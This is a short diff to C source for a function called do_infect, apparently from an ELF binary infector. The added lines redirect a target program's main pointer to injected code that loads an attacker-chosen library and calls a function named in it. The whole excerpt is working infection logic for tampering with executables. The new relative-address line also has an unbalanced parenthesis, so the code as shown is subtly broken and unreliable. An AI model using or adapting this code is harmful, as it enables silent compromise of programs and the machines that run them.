@@ -475,14 +475,28 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	// #4 library path
 	strcpy(cursor_dst, lib_path);
 	cursor_dst += strlen(lib_path);
-	// #5 functin name
+	// #5 function name
 	strcpy(cursor_dst, exported_func);
 	cursor_dst += strlen(exported_func);
 
 	// put in our new main
+	// which is pad_area.vaddr
 	// depends on if it is a relative address or not
-
-	// overwrite original main pointer
+	if (arg_main.rip == NULL) {
+		// absolute addressing
+		if (arg_main.addr_size != 4) {
+			printf("unsupported size\n");
+			return -1;
+		}
+		*((uint32_t*)arg_main.file_ptr) = (uint32_t)pad_area.vaddr;
+	} else {
+		// needs to be offset from rip
+		if (arg_main.addr_size != 4) {
+			printf("unsupported size\n");
+			return -1;
+		}
+		*((uint32_t*)arg_main.file_ptr) = (((int32_t)pad_area.vaddr) - ((int32_t)arg_main.rip);
+	}
 
 	// cleanup
 	close(tfd);
